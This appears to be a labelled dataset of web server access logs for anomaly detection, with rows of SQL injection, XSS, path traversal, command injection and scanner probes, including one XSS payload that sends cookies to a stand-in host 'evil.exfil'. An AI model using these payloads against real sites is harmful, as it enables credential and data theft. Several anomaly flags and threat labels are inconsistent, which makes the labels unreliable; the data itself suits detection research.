timestamp,ip,method,url,status,size,raw,parsed,request,potential_threats,message,level,Anomaly_Flag
09/May/2025:23:02:40 +0000,192.168.1.110,GET,/.git/HEAD,404.0,901.0,"192.168.1.110 - - [09/May/2025:23:02:40 +0000] ""GET /.git/HEAD HTTP/1.1"" 404 901",True,GET /.git/HEAD HTTP/1.1,,GET /.git/HEAD HTTP/1.1,INFO,0
09/May/2025:23:02:41 +0000,192.168.1.111,GET,/search?q=%3Cinput%20onfocus=write(document.cookie)%3E,200.0,234.0,"192.168.1.111 - - [09/May/2025:23:02:41 +0000] ""GET /search?q=%3Cinput%20onfocus=write(document.cookie)%3E HTTP/1.1"" 200 234",True,GET /search?q=%3Cinput%20onfocus=write(document.cookie)%3E HTTP/1.1,['XSS'],GET /search?q=%3Cinput%20onfocus=write(document.cookie)%3E HTTP/1.1,INFO,1
09/May/2025:23:02:42 +0000,192.168.1.112,GET,/../../../../../../../../var/log/nginx/access.log,404.0,567.0,"192.168.1.112 - - [09/May/2025:23:02:42 +0000] ""GET /../../../../../../../../var/log/nginx/access.log HTTP/1.1"" 404 567",True,GET /../../../../../../../../var/log/nginx/access.log HTTP/1.1,,GET /../../../../../../../../var/log/nginx/access.log HTTP/1.1,INFO,0
09/May/2025:23:02:43 +0000,192.168.1.113,GET,/display.php?id=1,200.0,890.0,"192.168.1.113 - - [09/May/2025:23:02:43 +0000] ""GET /display.php?id=1 UNION ALL SELECT schema_name FROM information_schema.schemata -- HTTP/1.1"" 200 890",True,GET /display.php?id=1 UNION ALL SELECT schema_name FROM information_schema.schemata -- HTTP/1.1,['SQL_INJECTION'],GET /display.php?id=1 UNION ALL SELECT schema_name FROM information_schema.schemata -- HTTP/1.1,INFO,1
09/May/2025:23:02:44 +0000,192.168.1.114,GET,/admin/users/add,403.0,123.0,"192.168.1.114 - - [09/May/2025:23:02:44 +0000] ""GET /admin/users/add HTTP/1.1"" 403 123",True,GET /admin/users/add HTTP/1.1,,GET /admin/users/add HTTP/1.1,INFO,1
09/May/2025:23:02:45 +0000,192.168.1.115,PROPFIND,/,405.0,456.0,"192.168.1.115 - - [09/May/2025:23:02:45 +0000] ""PROPFIND / HTTP/1.1"" 405 456",True,PROPFIND / HTTP/1.1,,PROPFIND / HTTP/1.1,INFO,0
09/May/2025:23:02:46 +0000,192.168.1.116,GET,/assets/..%2f..%2f..%2fetc/passwd,200.0,789.0,"192.168.1.116 - - [09/May/2025:23:02:46 +0000] ""GET /assets/..%2f..%2f..%2fetc/passwd HTTP/1.1"" 200 789",True,GET /assets/..%2f..%2f..%2fetc/passwd HTTP/1.1,,GET /assets/..%2f..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:02:47 +0000,192.168.1.117,GET,/showArticle?id=1'--,200.0,901.0,"192.168.1.117 - - [09/May/2025:23:02:47 +0000] ""GET /showArticle?id=1'-- HTTP/1.1"" 200 901",True,GET /showArticle?id=1'-- HTTP/1.1,,GET /showArticle?id=1'-- HTTP/1.1,INFO,0
09/May/2025:23:02:48 +0000,192.168.1.118,GET,/main.asp?param=<%25,200.0,234.0,"192.168.1.118 - - [09/May/2025:23:02:48 +0000] ""GET /main.asp?param=<%25 execute(request('evil_code')) %25> HTTP/1.1"" 200 234",True,GET /main.asp?param=<%25 execute(request('evil_code')) %25> HTTP/1.1,['XSS'],GET /main.asp?param=<%25 execute(request('evil_code')) %25> HTTP/1.1,INFO,1
09/May/2025:23:02:49 +0000,192.168.1.119,GET,/old_config.ini,403.0,567.0,"192.168.1.119 - - [09/May/2025:23:02:49 +0000] ""GET /old_config.ini HTTP/1.1"" 403 567",True,GET /old_config.ini HTTP/1.1,,GET /old_config.ini HTTP/1.1,INFO,1
09/May/2025:23:02:50 +0000,192.168.1.120,GET,/.dockerenv,404.0,890.0,"192.168.1.120 - - [09/May/2025:23:02:50 +0000] ""GET /.dockerenv HTTP/1.1"" 404 890",True,GET /.dockerenv HTTP/1.1,,GET /.dockerenv HTTP/1.1,INFO,0
09/May/2025:23:02:51 +0000,192.168.1.121,GET,/search?q=<object,200.0,123.0,"192.168.1.121 - - [09/May/2025:23:02:51 +0000] ""GET /search?q=<object data=\""data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\""> HTTP/1.1"" 200 123",True,"GET /search?q=<object data=\""data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\""> HTTP/1.1",['XSS'],"GET /search?q=<object data=\""data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\""> HTTP/1.1",INFO,1
09/May/2025:23:02:52 +0000,192.168.1.122,GET,/../../../../../../../../var/log/mail.log,404.0,456.0,"192.168.1.122 - - [09/May/2025:23:02:52 +0000] ""GET /../../../../../../../../var/log/mail.log HTTP/1.1"" 404 456",True,GET /../../../../../../../../var/log/mail.log HTTP/1.1,,GET /../../../../../../../../var/log/mail.log HTTP/1.1,INFO,0
09/May/2025:23:02:53 +0000,192.168.1.123,GET,/view.php?id=1,200.0,789.0,"192.168.1.123 - - [09/May/2025:23:02:53 +0000] ""GET /view.php?id=1 UNION ALL SELECT concat(user,0x3a,password) FROM users -- HTTP/1.1"" 200 789",True,"GET /view.php?id=1 UNION ALL SELECT concat(user,0x3a,password) FROM users -- HTTP/1.1",['SQL_INJECTION'],"GET /view.php?id=1 UNION ALL SELECT concat(user,0x3a,password) FROM users -- HTTP/1.1",INFO,1
09/May/2025:23:02:54 +0000,192.168.1.124,GET,/admin/backup,403.0,901.0,"192.168.1.124 - - [09/May/2025:23:02:54 +0000] ""GET /admin/backup HTTP/1.1"" 403 901",True,GET /admin/backup HTTP/1.1,,GET /admin/backup HTTP/1.1,INFO,1
09/May/2025:23:02:55 +0000,192.168.1.125,MKCOL,/,405.0,234.0,"192.168.1.125 - - [09/May/2025:23:02:55 +0000] ""MKCOL / HTTP/1.1"" 405 234",True,MKCOL / HTTP/1.1,,MKCOL / HTTP/1.1,INFO,0
09/May/2025:23:02:56 +0000,192.168.1.126,GET,/static/..%2f..%2f..%2fetc/passwd,200.0,567.0,"192.168.1.126 - - [09/May/2025:23:02:56 +0000] ""GET /static/..%2f..%2f..%2fetc/passwd HTTP/1.1"" 200 567",True,GET /static/..%2f..%2f..%2fetc/passwd HTTP/1.1,,GET /static/..%2f..%2f..%2fetc/passwd HTTP/1.1,INFO,0
09/May/2025:23:02:57 +0000,192.168.1.127,GET,/?cmd=ls,200.0,1011.0,"192.168.1.127 - - [09/May/2025:23:02:57 +0000] ""GET /?cmd=ls -al HTTP/1.1"" 200 1011",True,GET /?cmd=ls -al HTTP/1.1,,GET /?cmd=ls -al HTTP/1.1,INFO,0
09/May/2025:23:02:58 +0000,192.168.1.128,GET,/index.php?option=com_content&view=article&id=10;,200.0,1213.0,"192.168.1.128 - - [09/May/2025:23:02:58 +0000] ""GET /index.php?option=com_content&view=article&id=10; DROP TABLE news; -- HTTP/1.1"" 200 1213",True,GET /index.php?option=com_content&view=article&id=10; DROP TABLE news; -- HTTP/1.1,['SQL_INJECTION'],GET /index.php?option=com_content&view=article&id=10; DROP TABLE news; -- HTTP/1.1,INFO,1
09/May/2025:23:02:59 +0000,192.168.1.129,GET,/search?query=%3Ciframe%20src=javascript:prompt(document.cookie)%3E,200.0,1415.0,"192.168.1.129 - - [09/May/2025:23:02:59 +0000] ""GET /search?query=%3Ciframe%20src=javascript:prompt(document.cookie)%3E HTTP/1.1"" 200 1415",True,GET /search?query=%3Ciframe%20src=javascript:prompt(document.cookie)%3E HTTP/1.1,['XSS'],GET /search?query=%3Ciframe%20src=javascript:prompt(document.cookie)%3E HTTP/1.1,INFO,1
09/May/2025:23:03:00 +0000,192.168.1.130,GET,/download.php?file=../../sensitive_data.txt,200.0,1617.0,"192.168.1.130 - - [09/May/2025:23:03:00 +0000] ""GET /download.php?file=../../sensitive_data.txt HTTP/1.1"" 200 1617",True,GET /download.php?file=../../sensitive_data.txt HTTP/1.1,,GET /download.php?file=../../sensitive_data.txt HTTP/1.1,INFO,0
09/May/2025:23:03:01 +0000,192.168.1.131,GET,/?param=1',200.0,1819.0,"192.168.1.131 - - [09/May/2025:23:03:01 +0000] ""GET /?param=1' UNION /*!50000SELECT*/ 1,2,3 --+ HTTP/1.1"" 200 1819",True,"GET /?param=1' UNION /*!50000SELECT*/ 1,2,3 --+ HTTP/1.1",,"GET /?param=1' UNION /*!50000SELECT*/ 1,2,3 --+ HTTP/1.1",INFO,0
09/May/2025:23:03:02 +0000,192.168.1.132,GET,/vulnerable.php?input=<svg><script>alert(document.domain)</script></svg>,200.0,2021.0,"192.168.1.132 - - [09/May/2025:23:03:02 +0000] ""GET /vulnerable.php?input=<svg><script>alert(document.domain)</script></svg> HTTP/1.1"" 200 2021",True,GET /vulnerable.php?input=<svg><script>alert(document.domain)</script></svg> HTTP/1.1,['XSS'],GET /vulnerable.php?input=<svg><script>alert(document.domain)</script></svg> HTTP/1.1,INFO,1
09/May/2025:23:03:03 +0000,192.168.1.133,GET,/config,403.0,2223.0,"192.168.1.133 - - [09/May/2025:23:03:03 +0000] ""GET /config HTTP/1.1"" 403 2223",True,GET /config HTTP/1.1,,GET /config HTTP/1.1,INFO,1
09/May/2025:23:03:04 +0000,192.168.1.134,POST,/upload,413.0,2425.0,"192.168.1.134 - - [09/May/2025:23:03:04 +0000] ""POST /upload HTTP/1.1"" 413 2425",True,POST /upload HTTP/1.1,,POST /upload HTTP/1.1,INFO,0
09/May/2025:23:03:05 +0000,192.168.1.135,GET,/.git/HEAD,404.0,2627.0,"192.168.1.135 - - [09/May/2025:23:03:05 +0000] ""GET /.git/HEAD HTTP/1.1"" 404 2627",True,GET /.git/HEAD HTTP/1.1,,GET /.git/HEAD HTTP/1.1,INFO,0
09/May/2025:23:03:06 +0000,192.168.1.136,GET,/cgi-bin/php?,200.0,2829.0,"192.168.1.136 - - [09/May/2025:23:03:06 +0000] ""GET /cgi-bin/php? -s|echo 'Content-Type: text/html'; echo '<h1>Hello</h1>';| HTTP/1.1"" 200 2829",True,GET /cgi-bin/php? -s|echo 'Content-Type: text/html'; echo '<h1>Hello</h1>';| HTTP/1.1,['XSS'],GET /cgi-bin/php? -s|echo 'Content-Type: text/html'; echo '<h1>Hello</h1>';| HTTP/1.1,INFO,1
09/May/2025:23:03:07 +0000,192.168.1.137,GET,/?search=';,200.0,0.0,"192.168.1.137 - - [09/May/2025:23:03:07 +0000] ""GET /?search='; EXEC master..xp_cmdshell 'dir'; -- HTTP/1.1"" 200 0",True,GET /?search='; EXEC master..xp_cmdshell 'dir'; -- HTTP/1.1,,GET /?search='; EXEC master..xp_cmdshell 'dir'; -- HTTP/1.1,INFO,0
09/May/2025:23:03:08 +0000,192.168.1.138,GET,/?x=%3Cbody%20onload=prompt(document.cookie)%3E,200.0,123.0,"192.168.1.138 - - [09/May/2025:23:03:08 +0000] ""GET /?x=%3Cbody%20onload=prompt(document.cookie)%3E HTTP/1.1"" 200 123",True,GET /?x=%3Cbody%20onload=prompt(document.cookie)%3E HTTP/1.1,['XSS'],GET /?x=%3Cbody%20onload=prompt(document.cookie)%3E HTTP/1.1,INFO,1
09/May/2025:23:03:09 +0000,192.168.1.139,GET,/webdav/../../../../etc/passwd,401.0,456.0,"192.168.1.139 - - [09/May/2025:23:03:09 +0000] ""GET /webdav/../../../../etc/passwd HTTP/1.1"" 401 456",True,GET /webdav/../../../../etc/passwd HTTP/1.1,,GET /webdav/../../../../etc/passwd HTTP/1.1,INFO,1
09/May/2025:23:03:10 +0000,192.168.1.140,GET,/console,403.0,789.0,"192.168.1.140 - - [09/May/2025:23:03:10 +0000] ""GET /console HTTP/1.1"" 403 789",True,GET /console HTTP/1.1,,GET /console HTTP/1.1,INFO,1
09/May/2025:23:03:11 +0000,192.168.1.141,GET,/manager/html,401.0,901.0,"192.168.1.141 - - [09/May/2025:23:03:11 +0000] ""GET /manager/html HTTP/1.1"" 401 901",True,GET /manager/html HTTP/1.1,,GET /manager/html HTTP/1.1,INFO,1
09/May/2025:23:03:12 +0000,192.168.1.142,GET,/axis2/services/listServices,200.0,234.0,"192.168.1.142 - - [09/May/2025:23:03:12 +0000] ""GET /axis2/services/listServices HTTP/1.1"" 200 234",True,GET /axis2/services/listServices HTTP/1.1,,GET /axis2/services/listServices HTTP/1.1,INFO,0
09/May/2025:23:03:13 +0000,192.168.1.143,GET,/solr/admin/info/system?wt=json,200.0,567.0,"192.168.1.143 - - [09/May/2025:23:03:13 +0000] ""GET /solr/admin/info/system?wt=json HTTP/1.1"" 200 567",True,GET /solr/admin/info/system?wt=json HTTP/1.1,,GET /solr/admin/info/system?wt=json HTTP/1.1,INFO,0
09/May/2025:23:03:14 +0000,192.168.1.144,GET,/jenkins,302.0,890.0,"192.168.1.144 - - [09/May/2025:23:03:14 +0000] ""GET /jenkins HTTP/1.1"" 302 890",True,GET /jenkins HTTP/1.1,,GET /jenkins HTTP/1.1,INFO,0
09/May/2025:23:03:15 +0000,192.168.1.145,GET,/w00tw00t.at.ISC.SANS.DFIR,404.0,123.0,"192.168.1.145 - - [09/May/2025:23:03:15 +0000] ""GET /w00tw00t.at.ISC.SANS.DFIR HTTP/1.1"" 404 123",True,GET /w00tw00t.at.ISC.SANS.DFIR HTTP/1.1,,GET /w00tw00t.at.ISC.SANS.DFIR HTTP/1.1,INFO,0
09/May/2025:23:03:16 +0000,192.168.1.146,GET,/phpMyAdmin/scripts/setup.php,403.0,456.0,"192.168.1.146 - - [09/May/2025:23:03:16 +0000] ""GET /phpMyAdmin/scripts/setup.php HTTP/1.1"" 403 456",True,GET /phpMyAdmin/scripts/setup.php HTTP/1.1,,GET /phpMyAdmin/scripts/setup.php HTTP/1.1,INFO,1
09/May/2025:23:03:17 +0000,192.168.1.147,GET,/shell?cd+/&ls,404.0,789.0,"192.168.1.147 - - [09/May/2025:23:03:17 +0000] ""GET /shell?cd+/&ls -l HTTP/1.1"" 404 789",True,GET /shell?cd+/&ls -l HTTP/1.1,,GET /shell?cd+/&ls -l HTTP/1.1,INFO,0
09/May/2025:23:03:18 +0000,192.168.1.148,GET,/boaform/admin/formLogin,401.0,901.0,"192.168.1.148 - - [09/May/2025:23:03:18 +0000] ""GET /boaform/admin/formLogin HTTP/1.1"" 401 901",True,GET /boaform/admin/formLogin HTTP/1.1,,GET /boaform/admin/formLogin HTTP/1.1,INFO,1
09/May/2025:23:03:19 +0000,192.168.1.149,GET,/HNAP1/,404.0,234.0,"192.168.1.149 - - [09/May/2025:23:03:19 +0000] ""GET /HNAP1/ HTTP/1.1"" 404 234",True,GET /HNAP1/ HTTP/1.1,,GET /HNAP1/ HTTP/1.1,INFO,0
09/May/2025:23:03:20 +0000,192.168.1.150,GET,/login.cgi,401.0,567.0,"192.168.1.150 - - [09/May/2025:23:03:20 +0000] ""GET /login.cgi HTTP/1.1"" 401 567",True,GET /login.cgi HTTP/1.1,,GET /login.cgi HTTP/1.1,INFO,1
11/May/2025:13:25:00 +0100,192.168.1.151,GET,/?q=1;DECLARE,200.0,1345.0,"192.168.1.151 - - [11/May/2025:13:25:00 +0100] ""GET /?q=1;DECLARE @x VARCHAR(8000);SET @x=(SELECT TOP 1 password FROM users);EXEC(@x);-- HTTP/1.1"" 200 1345",True,GET /?q=1;DECLARE @x VARCHAR(8000);SET @x=(SELECT TOP 1 password FROM users);EXEC(@x);-- HTTP/1.1,['SQL_INJECTION'],GET /?q=1;DECLARE @x VARCHAR(8000);SET @x=(SELECT TOP 1 password FROM users);EXEC(@x);-- HTTP/1.1,INFO,1
11/May/2025:13:25:01 +0100,192.168.1.152,GET,/search?s=<img,200.0,2789.0,"192.168.1.152 - - [11/May/2025:13:25:01 +0100] ""GET /search?s=<img src=x onerror=fetch('//evil.exfil/data?c='+document.cookie)> HTTP/1.1"" 200 2789",True,GET /search?s=<img src=x onerror=fetch('//evil.exfil/data?c='+document.cookie)> HTTP/1.1,['XSS'],GET /search?s=<img src=x onerror=fetch('//evil.exfil/data?c='+document.cookie)> HTTP/1.1,INFO,1
11/May/2025:13:25:02 +0100,192.168.1.153,GET,/../../../../proc/self/environ,200.0,9123.0,"192.168.1.153 - - [11/May/2025:13:25:02 +0100] ""GET /../../../../proc/self/environ HTTP/1.1"" 200 9123",True,GET /../../../../proc/self/environ HTTP/1.1,,GET /../../../../proc/self/environ HTTP/1.1,INFO,0
11/May/2025:13:25:03 +0100,192.168.1.154,POST,/,200.0,5678.0,"192.168.1.154 - - [11/May/2025:13:25:03 +0100] ""POST / HTTP/1.1"" 200 5678",True,POST / HTTP/1.1,,POST / HTTP/1.1,INFO,0
11/May/2025:13:25:04 +0100,192.168.1.155,GET,/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh,404.0,1011.0,"192.168.1.155 - - [11/May/2025:13:25:04 +0100] ""GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1"" 404 1011",True,GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1,,GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1,INFO,0
11/May/2025:13:25:05 +0100,192.168.1.156,GET,"/?eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",200.0,1222.0,"192.168.1.156 - - [11/May/2025:13:25:05 +0100] ""GET /?eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)) HTTP/1.1"" 200 1222",True,"GET /?eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)) HTTP/1.1",,"GET /?eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)) HTTP/1.1",INFO,0
11/May/2025:13:25:06 +0100,192.168.1.157,GET,/index.php?page=file:///etc/passwd,200.0,3456.0,"192.168.1.157 - - [11/May/2025:13:25:06 +0100] ""GET /index.php?page=file:///etc/passwd HTTP/1.1"" 200 3456",True,GET /index.php?page=file:///etc/passwd HTTP/1.1,,GET /index.php?page=file:///etc/passwd HTTP/1.1,INFO,0
11/May/2025:13:25:07 +0100,192.168.1.158,GET,/?query=SELECT,200.0,7890.0,"192.168.1.158 - - [11/May/2025:13:25:07 +0100] ""GET /?query=SELECT column_name FROM information_schema.columns WHERE table_name='users' HTTP/1.1"" 200 7890",True,GET /?query=SELECT column_name FROM information_schema.columns WHERE table_name='users' HTTP/1.1,['SQL_INJECTION'],GET /?query=SELECT column_name FROM information_schema.columns WHERE table_name='users' HTTP/1.1,INFO,1
11/May/2025:13:25:08 +0100,192.168.1.159,GET,/<svg,200.0,4321.0,"192.168.1.159 - - [11/May/2025:13:25:08 +0100] ""GET /<svg xmlns=\""http://www.w3.org/2000/svg\"" onload=\""alert('XSS')\""></svg> HTTP/1.1"" 200 4321",True,"GET /<svg xmlns=\""http://www.w3.org/2000/svg\"" onload=\""alert('XSS')\""></svg> HTTP/1.1",['XSS'],"GET /<svg xmlns=\""http://www.w3.org/2000/svg\"" onload=\""alert('XSS')\""></svg> HTTP/1.1",INFO,1
11/May/2025:13:25:09 +0100,192.168.1.160,GET,/download?url=file:///etc/shadow,403.0,6789.0,"192.168.1.160 - - [11/May/2025:13:25:09 +0100] ""GET /download?url=file:///etc/shadow HTTP/1.1"" 403 6789",True,GET /download?url=file:///etc/shadow HTTP/1.1,,GET /download?url=file:///etc/shadow HTTP/1.1,INFO,1
11/May/2025:13:25:10 +0100,192.168.1.161,GET,/?id=1,200.0,9012.0,"192.168.1.161 - - [11/May/2025:13:25:10 +0100] ""GET /?id=1 AND SLEEP(5) -- HTTP/1.1"" 200 9012",True,GET /?id=1 AND SLEEP(5) -- HTTP/1.1,,GET /?id=1 AND SLEEP(5) -- HTTP/1.1,INFO,0
11/May/2025:13:25:11 +0100,192.168.1.162,GET,/?x=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C%22,200.0,1123.0,"192.168.1.162 - - [11/May/2025:13:25:11 +0100] ""GET /?x=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C%22 HTTP/1.1"" 200 1123",True,GET /?x=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C%22 HTTP/1.1,['XSS'],GET /?x=%22/%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C%22 HTTP/1.1,INFO,1
11/May/2025:13:25:12 +0100,192.168.1.163,GET,/../../../../var/www/html/config.inc.php,404.0,5678.0,"192.168.1.163 - - [11/May/2025:13:25:12 +0100] ""GET /../../../../var/www/html/config.inc.php HTTP/1.1"" 404 5678",True,GET /../../../../var/www/html/config.inc.php HTTP/1.1,,GET /../../../../var/www/html/config.inc.php HTTP/1.1,INFO,0
11/May/2025:13:25:13 +0100,192.168.1.164,GET,/cgi-bin/../../bin/bash,404.0,9012.0,"192.168.1.164 - - [11/May/2025:13:25:13 +0100] ""GET /cgi-bin/../../bin/bash -c 'id' HTTP/1.1"" 404 9012",True,GET /cgi-bin/../../bin/bash -c 'id' HTTP/1.1,,GET /cgi-bin/../../bin/bash -c 'id' HTTP/1.1,INFO,0
11/May/2025:13:25:14 +0100,192.168.1.165,GET,/?query=UNION,200.0,1234.0,"192.168.1.165 - - [11/May/2025:13:25:14 +0100] ""GET /?query=UNION ALL SELECT @@version -- HTTP/1.1"" 200 1234",True,GET /?query=UNION ALL SELECT @@version -- HTTP/1.1,,GET /?query=UNION ALL SELECT @@version -- HTTP/1.1,INFO,0
11/May/2025:13:25:15 +0100,192.168.1.166,GET,/?data=<style>*{animation-name:x;animation-duration:9s}</style><script>@keyframes,200.0,2345.0,"192.168.1.166 - - [11/May/2025:13:25:15 +0100] ""GET /?data=<style>*{animation-name:x;animation-duration:9s}</style><script>@keyframes x{}</script><div style=\""animation-name:x\"" onanimationstart=\""alert('XSS')\""></div> HTTP/1.1"" 200 2345",True,"GET /?data=<style>*{animation-name:x;animation-duration:9s}</style><script>@keyframes x{}</script><div style=\""animation-name:x\"" onanimationstart=\""alert('XSS')\""></div> HTTP/1.1",['XSS'],"GET /?data=<style>*{animation-name:x;animation-duration:9s}</style><script>@keyframes x{}</script><div style=\""animation-name:x\"" onanimationstart=\""alert('XSS')\""></div> HTTP/1.1",INFO,1
11/May/2025:13:25:16 +0100,192.168.1.167,GET,/logs/../../../../../../../../var/log/apache2/error.log,404.0,6789.0,"192.168.1.167 - - [11/May/2025:13:25:16 +0100] ""GET /logs/../../../../../../../../var/log/apache2/error.log HTTP/1.1"" 404 6789",True,GET /logs/../../../../../../../../var/log/apache2/error.log HTTP/1.1,,GET /logs/../../../../../../../../var/log/apache2/error.log HTTP/1.1,INFO,0
11/May/2025:13:25:17 +0100,192.168.1.168,GET,/?command=cat,400.0,9012.0,"192.168.1.168 - - [11/May/2025:13:25:17 +0100] ""GET /?command=cat /etc/passwd HTTP/1.1"" 400 9012",True,GET /?command=cat /etc/passwd HTTP/1.1,,GET /?command=cat /etc/passwd HTTP/1.1,INFO,1
11/May/2025:13:25:18 +0100,192.168.1.169,GET,/?search=%27;WAITFOR,200.0,1234.0,"192.168.1.169 - - [11/May/2025:13:25:18 +0100] ""GET /?search=%27;WAITFOR DELAY %270:0:5%27;-- HTTP/1.1"" 200 1234",True,GET /?search=%27;WAITFOR DELAY %270:0:5%27;-- HTTP/1.1,,GET /?search=%27;WAITFOR DELAY %270:0:5%27;-- HTTP/1.1,INFO,0
11/May/2025:13:25:19 +0100,192.168.1.170,GET,/?param=<iframe,200.0,2345.0,"192.168.1.170 - - [11/May/2025:13:25:19 +0100] ""GET /?param=<iframe src=\""data:text/html,<script>alert('XSS')</script>\""> HTTP/1.1"" 200 2345",True,"GET /?param=<iframe src=\""data:text/html,<script>alert('XSS')</script>\""> HTTP/1.1",['XSS'],"GET /?param=<iframe src=\""data:text/html,<script>alert('XSS')</script>\""> HTTP/1.1",INFO,1
